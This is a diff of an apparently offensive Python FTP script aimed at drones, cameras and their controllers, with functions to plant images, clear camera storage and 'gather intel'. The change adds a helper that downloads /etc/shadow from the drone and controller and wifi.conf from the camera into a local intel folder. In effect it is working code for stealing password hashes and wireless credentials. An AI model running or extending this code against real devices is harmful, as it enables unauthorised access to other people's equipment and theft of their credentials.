@@ -1,6 +1,6 @@
 from ftplib import FTP
 import os
-
+import os
 
 def plantrecoveryimage(ftp):
     
@@ -21,18 +21,23 @@ def cleardcim(ftp):
                 
                 
 def gatherinteldrone(ftp):
-    print 'gather drone intel'
-    ftp.cwd('run')
-    ftp.retrlines('LIST')
+    __retrievefile(ftp, '/etc/shadow', 'drone/')
 
 def gatherintelcamera(ftp):
-    print 'gather camera intel'
-    ftp.retrlines('LIST')
+    __retrievefile(ftp, '/MISC/wifi.conf', 'camera/')
 
 def gatherintelcontroller(ftp):
-    print 'gather controller intel'
-    ftp.cwd('run')
-    ftp.retrlines('LIST')
+    __retrievefile(ftp, '/etc/shadow', 'controller/')
+    
+    
+def __retrievefile(ftp, absolutepath, sub=''):
+    
+    try:
+        f = open('../intel/' + sub + absolutepath[1:].replace('/','-'), 'wb')
+        ftp.retrbinary('RETR ' + absolutepath, f.write)
+        f.close()
+    except Exception as e:
+        print str(e)
                 
 
 ########UNUSED ATTACKS BELOW########
